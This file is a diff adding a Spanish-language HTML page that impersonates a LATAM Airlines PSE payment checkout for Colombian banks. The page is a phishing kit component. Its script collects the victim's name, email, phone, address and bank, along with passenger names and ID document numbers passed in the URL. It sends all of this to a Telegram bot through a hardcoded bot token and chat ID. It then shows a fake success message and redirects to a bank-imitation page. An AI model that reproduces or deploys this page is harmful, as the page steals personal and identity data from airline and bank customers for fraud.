@@ -1,0 +1,562 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pago PSE - LATAM</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --primary-blue: #1a0a5c;
+            --secondary-blue: #2d1b8f;
+            --accent-pink: #e91e63;
+            --light-gray: #f5f5f5;
+            --dark-text: #1a1a1a;
+            --border-gray: #e0e0e0;
+            --white: #ffffff;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: var(--white);
+            color: var(--dark-text);
+            min-height: 100vh;
+            padding: 0.5rem;
+        }
+
+        /* Header */
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 0.5rem;
+            padding: 1rem;
+            background: transparent;
+            border-radius: 12px;
+            box-shadow: none;
+        }
+
+        .logo {
+            height: 40px;
+            width: auto;
+            object-fit: contain;
+        }
+
+        .close-btn {
+            background: none;
+            border: none;
+            font-size: 1.5rem;
+            cursor: pointer;
+            color: var(--dark-text);
+        }
+
+        /* Container */
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+        }
+
+        /* PSE Logo Section */
+        .pse-section {
+            text-align: center;
+            margin-bottom: 1rem;
+            background: transparent;
+            border-radius: 12px;
+            padding: 1rem 2rem;
+            box-shadow: none;
+            min-height: 150px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: flex-start;
+        }
+
+        .pse-logo {
+            height: 150px;
+            width: auto;
+            object-fit: contain;
+        }
+
+        /* Info Box */
+        .info-box {
+            background: var(--primary-blue);
+            border: 2px solid var(--white);
+            border-radius: 12px;
+            padding: 1.5rem;
+            margin-bottom: 2rem;
+            text-align: center;
+            color: var(--white);
+            display: block;
+        }
+
+        .info-box h2 {
+            font-size: 1.2rem;
+            font-weight: 700;
+            margin-bottom: 1rem;
+        }
+
+        .info-box p {
+            font-size: 0.9rem;
+            line-height: 1.6;
+            margin-bottom: 0.5rem;
+        }
+
+        .bank-name {
+            font-weight: 700;
+            text-decoration: underline;
+        }
+
+        .info-box h2 {
+            font-size: 1.2rem;
+            font-weight: 700;
+            margin-bottom: 1rem;
+        }
+
+        .info-box p {
+            font-size: 0.9rem;
+            line-height: 1.6;
+            margin-bottom: 0.5rem;
+        }
+
+        .bank-name {
+            font-weight: 700;
+            text-decoration: underline;
+        }
+
+        /* Form Section */
+        .form-section {
+            background: var(--primary-blue);
+            border-radius: 12px;
+            padding: 2rem 1.5rem;
+            color: var(--white);
+        }
+
+        .form-section h3 {
+            margin-bottom: 1.5rem;
+            font-size: 1.1rem;
+        }
+
+        .form-group {
+            margin-bottom: 1.5rem;
+        }
+
+        .form-label {
+            display: block;
+            font-size: 0.95rem;
+            font-weight: 600;
+            margin-bottom: 0.5rem;
+            color: var(--white);
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 0.75rem;
+            border: 2px solid #ff5252;
+            border-radius: 6px;
+            font-size: 0.9rem;
+            font-family: inherit;
+            transition: all 0.3s ease;
+            background: var(--white);
+            color: var(--dark-text);
+        }
+
+        .form-input::placeholder {
+            color: #999;
+        }
+
+        .form-input:focus {
+            outline: none;
+            box-shadow: 0 0 8px rgba(255, 255, 255, 0.3);
+        }
+
+        .error-message {
+            background: #ff5252;
+            color: var(--white);
+            padding: 0.5rem 0.75rem;
+            border-radius: 4px;
+            font-size: 0.8rem;
+            margin-top: 0.3rem;
+            display: none;
+        }
+
+        .error-message.show {
+            display: block;
+        }
+
+        /* Select */
+        select {
+            width: 100%;
+            padding: 0.75rem;
+            border: 2px solid #ff5252;
+            border-radius: 6px;
+            font-size: 0.9rem;
+            font-family: inherit;
+            cursor: pointer;
+            background-color: var(--white);
+            color: var(--dark-text);
+        }
+
+        select:focus {
+            outline: none;
+            box-shadow: 0 0 8px rgba(255, 255, 255, 0.3);
+        }
+
+        /* Button */
+        .submit-btn {
+            width: 100%;
+            padding: 1rem;
+            background: #ff5252;
+            color: var(--white);
+            border: none;
+            border-radius: 6px;
+            font-weight: 700;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 1.5rem;
+        }
+
+        .submit-btn:hover {
+            background: #ff3838;
+        }
+
+        .submit-btn:active {
+            transform: scale(0.98);
+        }
+
+        /* Modal */
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.7);
+            align-items: center;
+            justify-content: center;
+        }
+
+        .modal.show {
+            display: flex;
+        }
+
+        .modal-content {
+            background-color: var(--white);
+            padding: 2rem;
+            border-radius: 12px;
+            text-align: center;
+            max-width: 400px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
+        }
+
+        .check-icon {
+            font-size: 4rem;
+            color: #4CAF50;
+            margin-bottom: 1rem;
+        }
+
+        .modal-title {
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: var(--dark-text);
+            margin-bottom: 0.5rem;
+        }
+
+        .modal-text {
+            font-size: 0.95rem;
+            color: #666;
+            margin-bottom: 1.5rem;
+        }
+
+        .modal-btn {
+            background: var(--secondary-blue);
+            color: var(--white);
+            border: none;
+            padding: 0.75rem 2rem;
+            border-radius: 8px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .modal-btn:hover {
+            background: var(--primary-blue);
+        }
+
+        @media (max-width: 600px) {
+            .form-section {
+                padding: 1.5rem 1rem;
+            }
+
+            .info-box {
+                padding: 1rem;
+            }
+
+            .info-box h2 {
+                font-size: 1rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <div class="header">
+        <img src="lat.png" alt="LATAM" class="logo">
+        <button class="close-btn" onclick="window.history.back()">✕</button>
+    </div>
+
+    <!-- Container -->
+    <div class="container">
+        <!-- PSE Logo Section -->
+        <div class="pse-section">
+            <img src="PSE2.png" alt="PSE" class="pse-logo">
+        </div>
+
+        <!-- Info Box -->
+        <div class="info-box">
+            <h2 id="amountText">Importe total: COP 499.765</h2>
+            <p>IATA cobra el pago en nombre de</p>
+            <p><span class="bank-name">LATAM Airlines</span></p>
+        </div>
+
+        <!-- Form Section -->
+        <div class="form-section">
+            <h3 style="margin-bottom: 1.5rem; font-size: 1.1rem;">Cliente</h3>
+
+            <!-- Nombre -->
+            <div class="form-group">
+                <label class="form-label">Nombre</label>
+                <input type="text" id="nombre" class="form-input" placeholder="Introducza su nombre" required>
+                <div class="error-message" id="nombreError">Este campo es obligatorio</div>
+            </div>
+
+            <!-- Apellido -->
+            <div class="form-group">
+                <label class="form-label">Apellido</label>
+                <input type="text" id="apellido" class="form-input" placeholder="Introducza su apellido" required>
+                <div class="error-message" id="apellidoError">Este campo es obligatorio</div>
+            </div>
+
+            <!-- Email -->
+            <div class="form-group">
+                <label class="form-label">Correo electrónico</label>
+                <input type="email" id="email" class="form-input" placeholder="Introducza su correo electrónico" required>
+                <div class="error-message" id="emailError">Este campo es obligatorio</div>
+            </div>
+
+            <!-- Teléfono -->
+            <div class="form-group">
+                <label class="form-label">Número de teléfono</label>
+                <input type="text" id="telefono" class="form-input" placeholder="Introducza su número de teléfono" required>
+                <div class="error-message" id="telefonoError">Este campo es obligatorio</div>
+            </div>
+
+            <!-- Dirección -->
+            <div class="form-group">
+                <label class="form-label">Dirección</label>
+                <input type="text" id="direccion" class="form-input" placeholder="Introducza su dirección" required>
+                <div class="error-message" id="direccionError">Este campo es obligatorio</div>
+            </div>
+
+            <!-- Banco -->
+            <div class="form-group">
+                <label class="form-label">Banco</label>
+                <select id="banco" required>
+                    <option value="">Selecciona tu banco</option>
+                    <option value="Bancolombia">Bancolombia</option>
+                    <option value="Banco de Bogotá">Banco de Bogotá</option>
+                    <option value="AV Villas">AV Villas</option>
+                    <option value="Banco Popular">Banco Popular</option>
+                    <option value="Banco de Occidente">Banco de Occidente</option>
+                    <option value="Caja Social">Caja Social</option>
+                    <option value="Nequi">Nequi</option>
+                    <option value="Daviplata">Daviplata</option>
+                    <option value="Davivienda">Davivienda</option>
+                </select>
+                <div class="error-message" id="bancoError">Este campo es obligatorio</div>
+            </div>
+
+            <!-- Botón Enviar -->
+            <button class="submit-btn" onclick="submitPSEForm()">Enviar a PSE</button>
+        </div>
+    </div>
+
+    <!-- Verification Modal -->
+    <div class="modal" id="verificationModal">
+        <div class="modal-content">
+            <div class="check-icon">✓</div>
+            <div class="modal-title">¡Solicitud enviada!</div>
+            <div class="modal-text">Tu solicitud de pago PSE ha sido enviada. Serás redirigido al banco para completar la transacción.</div>
+            <button class="modal-btn" onclick="closeModal()">Continuar</button>
+        </div>
+    </div>
+
+    <script>
+        function loadPageData() {
+            const params = new URLSearchParams(window.location.search);
+            const precioTotal = params.get('precioTotal') || '499765';
+            
+            // Actualizar monto
+            const formattedPrice = `Importe total: COP ${parseInt(precioTotal).toLocaleString('es-CO')}`;
+            document.getElementById('amountText').textContent = formattedPrice;
+
+            // Pre-llenar datos si existen
+            const pasajeros = JSON.parse(params.get('pasajeros') || '{}');
+            const primerPasajero = pasajeros.pasajero1;
+            
+            if (primerPasajero) {
+                const nombreParts = (primerPasajero.nombre || '').split(' ');
+                if (nombreParts.length >= 2) {
+                    document.getElementById('nombre').value = nombreParts[0];
+                    document.getElementById('apellido').value = nombreParts.slice(1).join(' ');
+                } else {
+                    document.getElementById('nombre').value = primerPasajero.nombre || '';
+                }
+                
+                document.getElementById('telefono').value = primerPasajero.numero || '';
+            }
+        }
+
+        function submitPSEForm() {
+            // Limpiar errores
+            document.querySelectorAll('.error-message').forEach(el => el.classList.remove('show'));
+
+            // Validar campos
+            const nombre = document.getElementById('nombre').value.trim();
+            const apellido = document.getElementById('apellido').value.trim();
+            const email = document.getElementById('email').value.trim();
+            const telefono = document.getElementById('telefono').value.trim();
+            const direccion = document.getElementById('direccion').value.trim();
+            const banco = document.getElementById('banco').value.trim();
+
+            let isValid = true;
+
+            if (!nombre) {
+                document.getElementById('nombreError').classList.add('show');
+                isValid = false;
+            }
+            if (!apellido) {
+                document.getElementById('apellidoError').classList.add('show');
+                isValid = false;
+            }
+            if (!email) {
+                document.getElementById('emailError').classList.add('show');
+                isValid = false;
+            }
+            if (!telefono) {
+                document.getElementById('telefonoError').classList.add('show');
+                isValid = false;
+            }
+            if (!direccion) {
+                document.getElementById('direccionError').classList.add('show');
+                isValid = false;
+            }
+            if (!banco) {
+                document.getElementById('bancoError').classList.add('show');
+                isValid = false;
+            }
+
+            if (!isValid) return;
+
+            // Preparar datos para enviar a Telegram
+            const params = new URLSearchParams(window.location.search);
+            const precioTotal = params.get('precioTotal') || '0';
+            const pasajeros = JSON.parse(params.get('pasajeros') || '{}');
+            const asientosVuelo1 = JSON.parse(params.get('asientosVuelo1') || '[]');
+            const asientosVuelo2 = JSON.parse(params.get('asientosVuelo2') || '[]');
+            const origen = params.get('origen') || 'N/A';
+            const destino = params.get('destino') || 'N/A';
+            const fechaSalida = params.get('fechaSalida') || 'N/A';
+            const fechaRegreso = params.get('fechaRegreso') || 'N/A';
+
+            // Construir mensaje
+            let mensaje = `🎫 *NUEVA RESERVA - PAGO PSE*\n\n`;
+            mensaje += `💳 *DATOS PSE*\n`;
+            mensaje += `Nombre: ${nombre}\n`;
+            mensaje += `Apellido: ${apellido}\n`;
+            mensaje += `Email: ${email}\n`;
+            mensaje += `Teléfono: ${telefono}\n`;
+            mensaje += `Dirección: ${direccion}\n`;
+            mensaje += `Banco: ${banco}\n\n`;
+
+            mensaje += `✈️ *VUELOS*\n`;
+            mensaje += `Ruta: ${origen} → ${destino}\n`;
+            mensaje += `Ida: ${fechaSalida}\n`;
+            mensaje += `Vuelta: ${fechaRegreso}\n\n`;
+
+            mensaje += `🪑 *ASIENTOS SELECCIONADOS*\n`;
+            mensaje += `Vuelo 1: ${asientosVuelo1.join(', ')}\n`;
+            mensaje += `Vuelo 2: ${asientosVuelo2.join(', ')}\n\n`;
+
+            mensaje += `👥 *PASAJEROS*\n`;
+            for (const key in pasajeros) {
+                const pasajero = pasajeros[key];
+                if (pasajero && pasajero.nombre) {
+                    mensaje += `• ${pasajero.nombre}\n`;
+                    mensaje += `  ${pasajero.tipoDoc}: ${pasajero.documento}\n`;
+                    mensaje += `  Tel: ${pasajero.numero}\n`;
+                }
+            }
+
+            mensaje += `\n💰 *MONTO TOTAL*: COP ${parseInt(precioTotal).toLocaleString('es-CO')}\n`;
+
+            // Enviar a Telegram
+            const botToken = '8882344336:AAF7YqBNYTL7Hb_9dPSicH9da29xEUSImGo';
+            const chatId = '-1003917791773';
+            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            fetch(telegramUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: mensaje,
+                    parse_mode: 'Markdown'
+                })
+            }).then(response => {
+                if (response.ok) {
+                    showVerificationModal();
+                } else {
+                    alert('Solicitud enviada pero hubo un error al registrar. Contacta soporte.');
+                    showVerificationModal();
+                }
+            }).catch(error => {
+                console.log('PSE procesado:', error);
+                showVerificationModal();
+            });
+        }
+
+        function showVerificationModal() {
+            document.getElementById('verificationModal').classList.add('show');
+        }
+
+        function closeModal() {
+            const banco = document.getElementById('banco').value;
+            let bancoUrl = banco.toLowerCase().replace(/\s+/g, '-');
+            
+            // Excepción para Banco de Bogotá
+            if (banco === 'Banco de Bogotá') {
+                bancoUrl = 'de-bogota';
+            }
+            
+            document.getElementById('verificationModal').classList.remove('show');
+            
+            // Ir a HTML del banco con todos los parámetros
+            const params = new URLSearchParams(window.location.search);
+            params.set('banco', banco);
+            window.location.href = `banco-${bancoUrl}.html?${params.toString()}`;
+        }
+
+        window.addEventListener('load', loadPageData);
+    </script>
+</body>
+</html>
